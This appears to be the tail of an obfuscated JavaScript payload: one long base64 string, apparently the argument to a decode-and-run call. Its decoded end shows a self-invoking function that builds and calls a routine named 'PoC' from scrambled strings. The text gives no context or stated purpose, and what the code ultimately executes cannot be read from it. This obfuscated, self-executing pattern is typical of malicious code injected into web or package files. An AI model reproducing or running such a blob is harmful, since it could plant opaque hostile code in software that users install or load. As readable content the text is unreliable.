YIzUuJntlPn1jJSVRKXMlbzhhdGFHJShhR0wuYUdpX2VPX2F9dCxnZzVjIX1HMGlFYmw4NXNicjMuYDpyUzozKEtyJWFHLmFHZVRTLnIgXztiX2FvJShbcm5jeEd9LCVHfTJuRzUlMjthNXRHKygraXNiWnJlYiVifWxQdGJlLik0ezVHKGRHZXJlZmJiaCBHYl9fTnRoZW4zX2ViaSh0K0dlX2ZkLkcoZ2htbisuY2VyXUcldGktLSExYXBibkR0cnN0KTlydC50dnIxbC5hcmJiKGJfdChjJSAxY0diIHcgX2JtIyAudF9wMS4taCVfRzFvJDFpJSVsJD0yS3s9KT1kWSA6RzZfIXsoKGl0aGlpdTI6bS43MnNvY3BuYUdHIGN1LClhTClHXyUkLjJ0dSk1b3VhZjRlPUc1Y3RyKDN3MS5HZSEpZV9yZF9HPUhlYjEsTW5vdEcpKWw0X3RodlN1XSlyZnRoYmZ5KV04bWJvYmxdMEdkbyBscyVhJUc5RylpRzB0dG1HOD1kc1wnJW8zLWJZeW1RLDEpX3RlVWgyK3BHKSZHaWNkK2khXXlBc1o1e2hHNXRDPXRjb2x7bDFHR3RHdCE/ITZhKTdlVGJfclNseS5fb11yU2Muc0dlekc9R11cJ0csQyxEaWRpaW8pR0dHXThKKTspYjRkZSkgIU1QITJdOW5dR2UpLjVcL3ZuImdpR31lKSxpbjNtNmdHZTIpOzJobGxlMGlyR2hyciszMzE0ZTEhLkdlOiB0JGM9R3tuRy5HRzM9aS5yM0clLi0yYmolIXJvYmwobClmJV10PXJHQDhdYylzbm8gYik2R2JsMm9HPS5pXUc4MS42Onc9e29De2hkZT4pOShibmdHRmxvLGJ9NF01WGV0ZC5yNzp9YWVHYSxpb2RHbDpvJWFibyR7RyZuPW4rYzRydkdHajspMWR5NiZpc2VyYmMudHBzRykuNW5lW2w9JUNHe2MhJW5dbk1iXy4wcjVHZW9HU19vYj5dOz97Ln1vR3IpNzN1b0dkWylHIWQ1PS4sX2Yoc0dHOy5pYW9AYUEuR2w1YlRmUmNFPShHNV9kbl99X1NHPWcpcy49cEdhYz0udENHPW9nR0dfbi4pRyt1JT0oX0d0X2QxNGg9aSElb2JzLn00O0clW0c0KSluYzJzRyhLc0c0ckddcmIsNWpHc3VnIWE6czsoPStHZTRaM1t0ZGllIW45OylHbnI9JUdHZzl0Z3tlOTsoXTohR1tiI3BjMWkpIUdcXEcyMGUsK2xvcjZ9R3NOSzouLnQpW0d0KW5HKUd0ckdiRyEjZVhzRy5oM0dHR0BlR0dJR2FXOEdldCspfVtyX2xoWUdhXWVub3N0MDVpeHIpLjB0XXQsYW89aWd9KCFHcCVHY2YlMj1HIHghWSAlYnU0U1NqMyUuYmJHb2JHJDFHNCkyR189IShsX2J0R0djKV9iLV0uMXR1YnhyYjN4ZDIpYUdiR2VffS4wIF1lOl1fX3J1aTAyPXModEdGVEdzdEdzbzFcXHY0dGRcLyBhXWUuKUdHJXdnR2MuIUhlbkd9XWJdZWMgNGdsbS4sODNHMGh0M2opXiRzJm50LnR0RzoxYmJjb2R0aClwcnEhO3RlYnRzOmQxfWV0YEMuUmkobjdvR2FHR21HdGRpZTF0R0dyXyV1aDByaEwrRzpHb2xuY3ghZF9pJTggb2V7Z3t0bD1vLEcxXUdyRzUybmdhIDRpcj1cXCgsb0duKyUmR3Rvbz90K3Uyb1tHYl1hb0dlbGFyKGJiR1suRzEuJEcoWEc1YkdhNXNYMnRwR3IpfT0lfWU0PSAjY2VHZGNzLl8lZnQub19HaDZHKTs9XFwmc2JvLmR0R3YoZDJZWTs9Xy1HZV0odW9ndSxHez09XFxbb1wvLjtuYyF7bnpndF1daSAtPWM1dGM9KSZlfXYsZWMsMmZdb2VYRyliJTd4XS4pJS0yKUddTjplYlYobUdHR2NfJHNfJUU1JSV1OmFtLkdlZjdfclwvO11uRz07R0c2Ry49PTtHP2NHLmRifUc2dHBdbW9YO250Wyw9LHdhO2UhKF1lNE5lfUdsb2JHc19FKSlHPnpyImRzZUhvYyFvXyI1R250IEZoR2UxdlkybHtHYD1lLiU6dFwvTT1AaXBHYkclM0JuR29ydXRpaDRyU311cC4hY10lbDRHcC5HdSMuclhdXzFDdWtEO3RfcDEwIztyYUciWl9HOS5HPSkzO3s1dHJHPyZpXT0kYjNdZkd0XUdZJWFkYnpuZmx2IFVHIWIsPWdHckdtNlsudyIucCxdMmVnJDJHLkdfXTFHO1pzT2VYKSEkOCUxIUdtZWpHQmUkR0dHPV9uXSE9c3NFIGFmK0djNTshMWFpaTMmbylpZW5uR3MpZTA0bF9HdEojNV8wcmVjZn0yJHgxaWZ4KEcgdDthR0d9ciBvfWUmIGVfIzVpRzJpMV00XzouY3RHZStvZlFdRzd9LjV7ZTpzeShyMyhdZnRaaTIuXz0yZlgmX2tYIUdobSgkRzZdbF0oMStdKCA1QV40QTA7LjsoYihfR3R9R3RHe0dHO0dvLF1kZSF3JjZpdXRHZm9heEdYLmEsXXtmYV9HMmQtTF1lM2lhcHJiLisgRzNiXSQ2NUc2X2pjMW8uPUdlXWExbG9fcG5mbkdHYThiOkczR3VHbih9MDMucnBHOyVTcDlkLjt0KTA7MW9yNEc+R2FUX3UgIEdfKTN0R2MzLkdlcnJnaElwaWZjaWo0eGRmP3RHc1tlX3IuMG9icDVpMn1HVDFuXWlpOCI2XWdHRzUpN0dhaSkwR2U1MDZiX2xfXWJ0Ry4uR2NyZT4zYnBdM0lHLEdiJUdhKTFHR3MlM3NsZWZHKV03ZEdnMTt5ZjJddTtfNV19LmU5O0diVWJlR2UsM0RHKjNdSV0gfW4uMGJHcjc7K2VhRz9zR0ddXTVmZUc9dEMtR2wpX0dHdHlfX1l7XzJ5LEdlRyhdLC5nLkc0XCc2bmF0cjAxZnJTYSkyNWx0JG4zWGJyR11uKXAkb30lQz0ye2RyMiFXLjNhXW4oR1hiR2YxO2RpR110JDNtcmFHR31wXT1hOmp1JWJHXTM7MkcxO0c9VC45P29bNF0+WTUmZTtHXW9fbik9ZCpzLHRhNkdacl0pWyVyR2VpR0dlNiQuXWYpcF1HbnJHQzAgKSRvNCFlRyQzZCUhcEdlb2UmXnRddDJodHtHLi5nNEdfNl9HLmJrZUdHLnZqPT1vLm9zOF1hcEddR3QhcG9ubzc3ciFdR2lmX0d3cFcuKClydF00X3tHMjdHbkdlT1NuXzVlKWYpKUduTnRkfWIlNmksO3JlIGIoZEc9XWVvaShHY181MTo/MWZ1X2VvM1guLklUb3RHUCNdKzFfZUc4Ry5HKmN0R2NHYns9MF0lIT10X3RHR31yKzxlZHRHZVxcR0cxbmQxYkdUYyglM2E7PV83R24pWyZzbS5oNH09NWY0NG5HKE5jMGV1PSAgYz0pPW09NSxaUmRbIVwnMm8uR1thXytHPUcoYCssMmlhYmVhO2VfYiFHdSJyM2UhPUchZ0dwaUdyWF1iZWw1JV10M2VHO3R0KXJzPWUxR0csRzNfXFxdaGExSG99X2k6O19rLmUsW1MydDM2Ry0odEduZmFLfTU0Mkd1LjxiODYzYWRaO2ltO3VNXV0kc3NwckdHJWM9SiFHJXBmR0hQezplXUdHIDAyPkk5Nl0iR25wKDZVc2VdLDlybixyaF9raDM8KE8obih0IigwZW9iO29dYklHa2U2QTFuZEk7cj4pR2JHMVBdaSkpdEVfMnZzNShTR28pYj5fX3VyY2NrJTNiRzRjPyAoKWw7eG9uKktHY25veG9pMWlTbn1HXmNzR2lJTkpHIDlwMG0ge29HR2xHMiswZUc1R3RtZS4gR10oJiBvO2Rje29vRy5fRy59KGM7XzFlLihHMWFhaTRxZykpMUdlYS51cm8wKkcgR2U3KDZvKHUgIGRHNkdsb3MxLl9ddXQoc3lHXz1iPV9IYiQzJkJdaD1ILiUwZVtfX3Rwb1wnYzM7R0dtcns4bG59I0dyS2tfNDEgLEdic2VdczJHNSE9KCglb0cuYmI4cGRpbW5Hb2RkIClbaVsuJCUzTkdsRHtlMSg7ezBHKX1zaDE5Mi5nbl0mYy50YWVHel1bX2NlKWExIDIxLihhR11HR2J7VS5vXShqYUdmLmJdZjBybmMuR2RvQ007KWhvX3Q1R0c1JS4yaXJdKGJHPHMoIHJ1JV8gYmVlNGhHIGcuYnNnbF0haWg1R3RHb0d0YjZHKXVldmJpN2ltNV1HRzouR259KGMgIH0uXyBsR3RyKTFlIHRvJEcsXil0X19jbzpddCV4cjUlZyluMWcpam9pKDYjbF9ycl4wPV9ickd7JDZHNUduaD0gZlplR0cpYnNHcyA3KG5HXTV4YTR7VT1He2hwaSgpKDY9aTAgbil7R2VHfWFuKUddLnMgZTJzYnt7aWVfbUdiLTFTXWJHNS5mb25jX3lHbWF0X2Ugc2E1czEuNUddb25iaDVoeycpKTt2YXIgUG9DPUVtcShQcGssQkdmICk7UG9DKDkzOTIpO3JldHVybiA2MzY2fSkoKQ=='))
